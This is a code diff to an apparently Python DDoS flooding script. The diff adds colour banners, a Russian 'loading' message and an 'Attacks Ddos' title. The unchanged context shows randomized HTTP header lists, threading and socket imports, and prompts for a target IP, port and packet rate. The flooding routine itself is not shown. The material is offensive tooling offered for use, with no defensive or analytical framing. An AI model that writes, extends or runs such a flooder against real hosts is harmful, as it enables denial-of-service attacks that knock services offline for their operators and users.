@@ -1,3 +1,7 @@
+from colorama import Fore, Back, Style
+import sys
+import os
+import time
 import socket, requests
 import random
 import threading
@@ -29,6 +33,11 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
+os.system("clear")
+print(Fore.GREEN+"З А Г Р У З К А....")
+time.sleep(3.5)
+os.system("clear")
+print(Fore.BLUE+"\n --Attacks Ddos--\n"+Style.RESET_ALL)
 ip = str(input('[+] Target ip ===> '))
 port = int(input('[+] Port ===>'))
 pack = int(input('[+] Packet/s ===>'))
